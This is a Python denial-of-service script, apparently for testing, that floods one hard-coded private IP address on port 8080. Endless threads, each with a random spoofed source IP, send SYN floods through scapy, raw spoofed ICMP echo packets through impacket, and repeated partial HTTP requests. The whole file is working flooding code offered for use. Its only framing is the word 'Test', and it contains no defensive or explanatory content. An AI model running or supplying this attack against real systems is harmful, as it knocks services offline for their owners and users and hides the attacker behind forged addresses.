#!/usr/bin/env python3

import time
import os
import sys
import string
import socket
import random
from scapy.all import *
from impacket import ImpactDecoder, ImpactPacket  # Ensure impacket is installed

conf.verb = 0

print("DDoS Attack Starting: IP Spoof Test")

# Our target's IP:
target_ip = '192.168.0.113'  # Updated IP address
port = 8080
message = "12345"

def ddos(src, dst):
    # Create a new IP packet and set its source and destination addresses
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)

    # Create a new ICMP packet
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHO)

    # Include a small payload inside the ICMP packet
    # and have the IP packet contain the ICMP packet
    icmp.contains(ImpactPacket.Data("O" * 100))
    ip.contains(icmp)
    
    while True:
        print(f"Spoofing from {src}")

        # Using Scapy to SYN flood
        p1 = IP(dst=target_ip, src=src) / TCP(dport=port, sport=random.randint(1024, 65535), flags='S')
        send(p1)
        
        # Using ImpactPacket to flood/spoof
        icmp.set_icmp_id(random.randint(0, 65535))  # Randomize ICMP ID
        icmp.set_icmp_cksum(0)  # Calculate checksum
        icmp.auto_checksum = 0
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.sendto(ip.get_packet(), (dst, 8080))

        # Regular socket connection
        try:
            ddos_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos_conn.connect((target_ip, port))
            ddos_conn.send(f"GET /{message} HTTP/1.1\r\n".encode('utf-8'))
            ddos_conn.close()
        except socket.error as e:
            print(f"Connection failed: {e}")

# Randomizing IP Values and make new threads
while True:
    src = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    threading.Thread(target=ddos, args=(src, target_ip)).start()
    time.sleep(0.1)
